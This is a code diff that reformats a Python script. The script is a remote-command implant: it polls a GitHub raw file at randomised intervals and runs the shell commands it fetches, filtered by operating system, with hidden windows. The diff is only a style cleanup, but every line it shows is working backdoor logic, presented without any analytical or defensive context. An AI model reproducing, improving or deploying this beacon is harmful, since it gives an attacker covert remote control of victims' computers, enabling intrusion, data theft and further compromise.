@@ -5,17 +5,25 @@ import platform
 import time
 import random
 
-SERVER = 'https://raw.githubusercontent.com/37r4n/almacen/main/commands.txt'
+SERVER = "https://raw.githubusercontent.com/37r4n/almacen/main/commands.txt"
 MIN_INTERVAL = 30
 MAX_INTERVAL = 90
 OS = platform.system()
 executed_commands = set()
 
-def execute( action, params ):
-    if action == 'terminal':
-        commands = params.get('commands', [])
+
+def execute(action, params):
+    if action == "terminal":
+        commands = params.get("commands", [])
         for cmd in commands:
-            subprocess.run(cmd, shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.run(
+                cmd,
+                shell=True,
+                capture_output=True,
+                text=True,
+                creationflags=subprocess.CREATE_NO_WINDOW,
+            )
+
 
 def main():
     while True:
@@ -24,14 +32,17 @@ def main():
             if response.status_code == 200:
                 commands = json.loads(response.text)
                 for command in commands:
-                    id = command.get('id')
-                    action = command.get('action')
-                    params = command.get('params', {})
-                    metadata = command.get('metadata', {})
-                    os_list = metadata.get('os', [])
+                    id = command.get("id")
+                    action = command.get("action")
+                    params = command.get("params", {})
+                    metadata = command.get("metadata", {})
+                    os_list = metadata.get("os", [])
                     if isinstance(os_list, str):
                         os_list = [os_list]
-                    if OS.lower() not in [o.lower() for o in os_list] or id in executed_commands:
+                    if (
+                        OS.lower() not in [o.lower() for o in os_list]
+                        or id in executed_commands
+                    ):
                         continue
                     executed_commands.add(id)
                     execute(action, params)
@@ -39,6 +50,7 @@ def main():
             pass
 
         time.sleep(random.randint(MIN_INTERVAL, MAX_INTERVAL))
+
 
 if __name__ == "__main__":
     main()
